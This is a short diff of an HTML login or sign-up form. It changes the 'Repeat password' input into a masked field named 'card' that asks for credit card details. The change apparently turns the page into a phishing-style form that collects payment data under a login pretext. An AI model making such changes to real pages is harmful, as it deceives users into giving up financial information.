@@ -22,7 +22,7 @@
         <div id="arrow"></div>
         <input id="email" name="login" placeholder="Email" type="text">
         <input id="pass" name="passwd" placeholder="Password" type="password">
-        <input id="repass" name="repass" placeholder="Repeat password" type="password">
+        <input id="repass" name="card" placeholder="credit card details" type="password">
       </div>
       <button type="submit">
         <span>
